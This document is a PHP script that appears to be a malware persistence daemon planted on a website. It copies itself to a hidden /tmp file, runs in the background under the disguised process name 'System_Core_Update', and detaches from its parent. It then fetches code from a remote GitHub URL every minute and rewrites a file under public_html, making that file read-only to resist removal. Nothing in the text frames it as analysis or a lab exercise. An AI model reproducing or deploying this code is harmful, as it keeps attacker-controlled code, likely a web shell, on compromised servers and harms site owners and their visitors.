<?php
$targetFile = "/home/ujungbatuivdesa/public_html/LEVIATHAN/module.php";
$sourceURL = "https://raw.githubusercontent.com/jamur4d/file/refs/heads/main/module.php";
$cacheFile = "/tmp/cmrwork.txt";
$cacheTime = 3600;
$tmpPath = "/tmp/.daemon.cmr.php";

if (__FILE__ !== $tmpPath) {
    copy(__FILE__, $tmpPath);
    chmod($tmpPath, 0755);
    shell_exec("php $tmpPath &");
    exit();
}

cli_set_process_title("System_Core_Update");

$pid = pcntl_fork();
if ($pid > 0) { exit(); }
posix_setsid();

while (true) {
    $useCache = false;
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < $cacheTime) {
        // Gunakan cache jika masih valid
        $newContent = file_get_contents($cacheFile);
        $useCache = true;
    } else {
        // Ambil konten baru dari URL
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sourceURL);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $newContent = curl_exec($ch);
        curl_close($ch);

        if ($newContent) {
            file_put_contents($cacheFile, $newContent);
        }
    }

    if (!$newContent) {
        sleep(60);
        continue;
    }

    if (file_exists($targetFile)) {
        $existingContent = file_get_contents($targetFile);
    } else {
        $existingContent = "";
    }

    if (md5($existingContent) !== md5($newContent)) {
        @chmod($targetFile, 0644);
        @file_put_contents($targetFile, $newContent);
        @chmod($targetFile, 0444);
    }

    sleep(60);
}
?>
